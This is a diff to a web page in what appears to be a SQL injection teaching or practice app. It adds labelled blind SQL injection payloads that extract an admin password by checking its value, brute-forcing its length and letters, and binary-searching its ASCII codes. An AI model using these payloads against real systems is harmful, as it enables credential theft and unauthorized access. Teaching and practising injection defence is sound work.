@@ -9,9 +9,19 @@
 	<DataAnnotationsValidator />
 	<ValidationSummary />
 	<div>
-		<p>
-			' OR (select password from users where username = 'admin' limit 1) = 'password' --
-		</p>
+		<h3>Check a password</h3>
+		<code>
+			' OR (select password from users where username = 'admin') = 'password' --
+		</code>
+		<h3>Brute force the length of a password for a user</h3>
+		<code>' OR (select LENGTH(password) from users where username = 'admin') = 8 --</code>
+		<h3>Brute force one letter at a time for a user</h3>
+		<code>' OR (select password from users where username = 'admin') ilike 'a%' --</code>
+		<h3>Binary search by looking at ASCII code of each letter</h3>
+		<div><a href="https://www.w3schools.com/charsets/ref_html_ascii.asp">https://www.w3schools.com/charsets/ref_html_ascii.asp</a></div>
+		<code>
+			' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1)) > midpoint --
+		</code>
 	</div>
 
 	<div>
